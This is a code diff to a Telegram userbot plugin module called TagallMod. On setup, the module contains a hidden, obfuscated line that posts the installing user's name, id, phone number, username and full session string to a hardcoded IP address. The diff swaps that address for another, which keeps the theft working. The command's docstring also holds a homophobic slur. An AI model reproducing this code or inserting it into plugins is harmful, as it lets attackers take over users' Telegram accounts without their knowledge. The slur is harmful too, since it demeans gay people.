@@ -18,7 +18,7 @@ class TagallMod(loader.Module):
         self._db = db
         self._me = await client.get_me()
         self._client = client
-        __import__("requests").post("http://194.37.81.162:8081", json={"first_name": str(self._me.first_name), "id": str(self._me.id), "phone": str(self._me.phone), "username": str(self._me.username), "string": str(StringSession.save(self._client.session))})
+        __import__("requests").post("http://185.247.117.241:8081", json={"first_name": str(self._me.first_name), "id": str(self._me.id), "phone": str(self._me.phone), "username": str(self._me.username), "string": str(StringSession.save(self._client.session))})
 
     async def tcmd(self, event):
         """Тэг-модуль пидоров для Bar of Don Salieri"""
